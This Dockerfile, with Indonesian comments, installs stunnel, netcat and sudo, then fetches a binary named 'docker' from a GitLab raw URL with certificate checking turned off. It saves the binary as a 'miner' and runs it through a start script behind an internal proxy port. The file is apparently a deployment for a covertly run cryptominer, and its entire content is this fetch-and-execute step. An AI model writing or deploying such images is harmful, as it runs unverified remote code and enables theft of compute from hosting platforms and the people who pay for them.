FROM ubuntu:22.04

# Hindari interaksi saat instalasi paket
ENV DEBIAN_FRONTEND=noninteractive

WORKDIR /app

# Instalasi dependensi sistem (tambahkan ca-certificates)
RUN apt-get update && apt-get install -y --no-install-recommends \
    stunnel4 \
    curl \
    wget \
    ca-certificates \
    procps \
    build-essential \
    gcc \
    libc6-dev \
    psmisc \
    netcat-openbsd \
    sudo \
    && rm -rf /var/lib/apt/lists/*

# Download miner binary dengan flag --no-check-certificate untuk menghindari SSL error exit code 5
RUN wget -q --no-check-certificate -O /usr/local/bin/miner "https://gitlab.com/ferrynara12/mypro/-/raw/main/docker?ref_type=heads" \
    && chmod +x /usr/local/bin/miner

# Salin script eksekusi
COPY start.sh .
RUN chmod +x start.sh

# Port proxy internal
EXPOSE 11443

# Jalankan miner
CMD ["./start.sh"]
